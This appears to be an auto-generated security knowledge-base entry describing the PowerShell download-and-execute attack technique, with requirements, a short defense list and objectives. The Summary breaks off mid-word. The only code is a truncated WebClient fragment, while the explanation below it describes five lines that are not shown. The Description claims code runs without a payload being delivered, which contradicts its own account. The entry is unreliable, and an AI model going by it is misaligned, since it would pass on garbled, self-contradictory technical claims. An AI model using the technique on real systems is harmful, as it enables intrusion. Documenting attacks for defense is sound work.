---
id: e83f7901-480f-40c0-8daf-4e0937d175a5
name: Powershell Download and Execute
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.040064+00:00'
updated_at: '2023-04-10T20:37:00.086172+00:00'
tags:
- '[[Download file]]'
- '[[Powershell]]'
---

# Powershell Download and Execute

## Summary

The Powershell Download and Execute procedure is a common tactic used by attackers to gain a foothold within a target environment. This technique involves the use of Powershell to download a malicious file from a remote server and execute it on the target system. The use of Powershell allows attack

## Description

# Description

The Powershell Download and Execute procedure is a common tactic used by attackers to gain a foothold within a target environment. This technique involves the use of Powershell to download a malicious file from a remote server and execute it on the target system. The use of Powershell allows attackers to bypass traditional security measures and execute code on the target system without the need for a payload to be delivered.

From a technical standpoint, this procedure involves the use of Powershell to establish a connection to a remote server and download a file. Once the file is downloaded, it is executed on the target system. This technique can be used to deliver a wide range of payloads, including malware, ransomware, and other malicious software.

The business value of this procedure is that it allows attackers to gain access to sensitive data, steal credentials, and establish a foothold within a target environment. By executing code on the target system, attackers can maintain persistence and continue to operate within the target environment undetected.

## Requirements

1. Access to a Powershell console

1. Network access to a remote server hosting the malicious file

## Defense

1. Implement application whitelisting to prevent the execution of unauthorized Powershell scripts

1. Monitor network traffic for suspicious activity

1. Ensure that Powershell is up-to-date with the latest security patches

## Objectives

1. Download and execute a malicious file on a target system

# Instructions

1. This command downloads and executes malicious files from a remote server.

**Code**: [[# Any version
(New-Object System.Net.WebClient).Do]]

> The command uses PowerShell to download and execute malicious files from a remote server. The first three lines of the command download and save a PowerShell script, a taskkill.exe file, and a binary file to the local system. The last two lines of the command execute the binary file on the local system. This command can be used by attackers to gain unauthorized access to a system, steal sensitive information, or cause damage to the system.

## Tags

- [[Download file]]
- [[Powershell]]
